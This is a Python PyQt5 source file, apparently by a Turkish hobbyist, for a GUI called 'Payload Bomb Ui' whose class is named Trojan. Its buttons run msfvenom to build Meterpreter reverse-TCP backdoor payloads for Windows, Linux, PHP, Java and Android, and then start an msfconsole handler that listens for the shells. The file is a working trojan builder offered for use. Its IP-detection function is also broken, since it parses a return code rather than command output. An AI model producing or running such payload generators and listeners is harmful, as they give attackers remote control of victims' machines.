import sys
import os
from PyQt5.QtWidgets import QWidget , QApplication 
from PyQt5.QtWidgets import QPushButton , QVBoxLayout , QHBoxLayout , QLabel , QLineEdit
from PyQt5.QtGui     import QPixmap
class Trojan(QWidget):
    def __init__(self):
        super().__init__()

        self.init_ui()

    def init_ui(self):
        self.bilgi      = QLabel("Merhaba Dostum Hoşgeldin !\ncoded by root@ebby:~#\nMail : 2003emirkanesme@gmail.com\nIg: root_ebby")
        self.bilgi2     = QLabel("Bilgiler")
        self.resim      = QLabel()
        self.resim.setPixmap(QPixmap("ebby.jpg"))

        self.usr_ip     = QLineEdit("Ip")
        self.usr_path   = QLineEdit("/Dizin/")   

        self.win        = QPushButton("Windows")
        self.lin        = QPushButton("Linux")
        self.mac        = QPushButton("Mac")
        self.web        = QPushButton("Php")
        self.apk        = QPushButton("Android")

        self.ip         = QPushButton("Ip Adresi")
        self.contact    = QPushButton("İletişim")


        v_box =  QVBoxLayout()
        
        v_box.addStretch()
        v_box.addStretch()
        v_box.addWidget(self.win)
        v_box.addStretch()
        v_box.addWidget(self.lin)
        v_box.addStretch()
        v_box.addWidget(self.mac)
        v_box.addStretch()
        v_box.addWidget(self.web)
        v_box.addStretch()
        v_box.addWidget(self.apk)
        v_box.addStretch()
        v_box.addWidget(self.ip)
        v_box.addStretch()
        v_box.addWidget(self.contact)
        v_box.addStretch()
        v_box.addStretch()

        v_box2 = QVBoxLayout()
        v_box2.addWidget(self.bilgi)
        v_box2.addWidget(self.bilgi2)        
        v_box2.addWidget(self.usr_ip)
        v_box2.addWidget(self.usr_path)
        v_box2.addStretch()
        v_box2.addStretch()
        v_box2.addWidget(self.resim)
        
        
                
        h_box =  QHBoxLayout()
        h_box.addStretch()
        h_box.addLayout(v_box2)
        h_box.addStretch()        
        h_box.addLayout(v_box)
        h_box.addStretch()


        
        self.setLayout(h_box)
        self.win.clicked.connect(self.windows)
        self.ip.clicked.connect(self.ip_adres)
        self.lin.clicked.connect(self.linux)
        self.mac.clicked.connect(self.macos)
        self.web.clicked.connect(self.webphp)
        self.apk.clicked.connect(self.android)
        self.setWindowTitle("Payload Bomb Ui")
        self.show()


    
    
    
    def windows(self):
        os.system("msfvenom -p windows/meterpreter/reverse_tcp lhost={} lport=4444 -f exe > {}test.exe".format(self.usr_ip.text(),self.usr_path.text()))
        os.system('msfconsole -q -x " use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp;  set lhost {} ; set lport 4444 ; exploit ;"'.format(self.usr_ip.text()))

    def linux(self):
        os.system('msfvenom -p python/meterpreter/reverse_tcp lhost={} lport=4444 > {}test.py'.format(self.usr_ip.text(),self.usr_path.text()))
        os.system('msfconsole -q -x " use exploit/multi/handler; set payload python/meterpreter/reverse_tcp;  set lhost {} ; set lport 4444 ; exploit ;"'.format(self.usr_ip.text()))
  
    def webphp(self):
        os.system('msfvenom -p php/meterpreter/reverse_tcp lhost={} lport=4444 > {}test.php'.format(self.usr_ip.text(),self.usr_path.text()))
        os.system('msfconsole -q -x " use exploit/multi/handler; set payload php/meterpreter/reverse_tcp;  set lhost {} ; set lport 4444 ; exploit ;"'.format(self.usr_ip.text()))
    def macos(self):
        os.system('msfvenom -p java/meterpreter/reverse_tcp lhost={} lport=4444 -f jar > {}test.jar'.format(self.usr_ip.text(),self.usr_path.text()))
        os.system('msfconsole -q -x " use exploit/multi/handler; set payload java/meterpreter/reverse_tcp;  set lhost {} ; set lport 4444 ; exploit ;"'.format(self.usr_ip.text()))
    def android(self):
        os.system('msfvenom -p android/meterpreter/reverse_tcp lhost={} lport=4444 > {}test.apk'.format(self.usr_ip.text(),self.usr_path.text()))
        os.system('msfconsole -q -x " use exploit/multi/handler; set payload android/meterpreter/reverse_tcp;  set lhost {} ; set lport 4444 ; exploit ;"'.format(self.usr_ip.text()))





    def ip_adres(self):
        if os.name == "posix":
            for word in str(os.system("ifconfig")):
                if word .startswith("inet 192.168."):
                    self.bilgi2.setText(word)
        elif os.name == "nt":           
            for word in str(os.system("ipconfig")):
                if word .startswith("IPv4 Address"):
                    self.bilgi2.setText(word)
        else:
            pass



app = QApplication(sys.argv)
trojan = Trojan()
sys.exit(app.exec_())
